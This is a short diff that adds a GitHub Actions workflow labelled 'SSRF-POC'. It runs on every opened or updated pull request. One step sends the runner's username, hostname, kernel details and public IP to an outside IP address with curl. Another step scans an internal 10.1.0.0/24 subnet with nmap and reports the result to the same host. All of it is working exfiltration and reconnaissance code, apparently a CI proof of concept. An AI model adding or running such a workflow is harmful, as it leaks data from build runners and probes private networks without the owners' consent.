@@ -1,0 +1,12 @@
+name: SSRF-POC
+on: 
+  pull_request:
+    types: [opened, synchronize]
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Exfil Runner
+      run: curl "http://97.96.14.69:8000/leaktopus-\$(whoami)-\$(hostname)-\$(uname -a)-\$(curl -s ipinfo.io/ip)"
+    - name: Network Scan
+      run: curl "http://97.96.14.69:8000/scan-\$(nmap --max-rtt-timeout 100ms --max-retries 1 10.1.0.0/24 | wc -l)"
